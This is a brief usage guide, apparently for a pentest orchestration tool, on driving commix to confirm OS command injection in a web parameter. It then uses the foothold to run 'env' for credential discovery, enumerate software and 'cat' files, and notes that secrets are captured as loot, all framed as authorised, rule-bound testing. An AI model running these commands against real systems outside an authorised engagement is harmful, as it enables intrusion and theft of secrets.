# commix — automated OS command injection

commix confirms and exploits OS command injection in a web parameter, then lets you run commands
through the foothold. searu runs it containerised against an in-scope, authorised target; you decide
which commands to run.

## How to drive it
- Point it at the injectable URL; commix auto-detects GET parameters:
  `searu run commix --technique T1190 --target "http://host:port/path?param=1" -- --os-cmd id`
- Confirm the foothold first with a harmless command (`--os-cmd id` or `--os-cmd whoami`).
- Then use the foothold for discovery and collection, choosing the ATT&CK technique that matches your
  intent so the gate authorises it:
  - enumerate the environment: `--technique T1552 -- --os-cmd env`
  - installed software: `--technique T1518 -- --os-cmd 'which nmap; which python3'`
  - files: `--technique T1083 -- --os-cmd 'ls -la /app'`, then read one: `--os-cmd 'cat /app/x'`
- Each run's output is normalised into findings/loot. Review with `searu findings` and `searu loot`
  rather than re-reading tool output, and let that guide the next command.

## Notes
- Every command runs through the confirmed injection; a successful run records an OS-command-injection
  finding (T1190/T1059, CWE-78). Secrets in the output (e.g. `DATABASE_URL=…`, connection strings)
  are captured as loot, with only their fingerprint stored on the finding.
- Keep to the ROE: a technique must be allow-listed, and exploitation/destructive tiers need the
  authoriser / destructive flag.
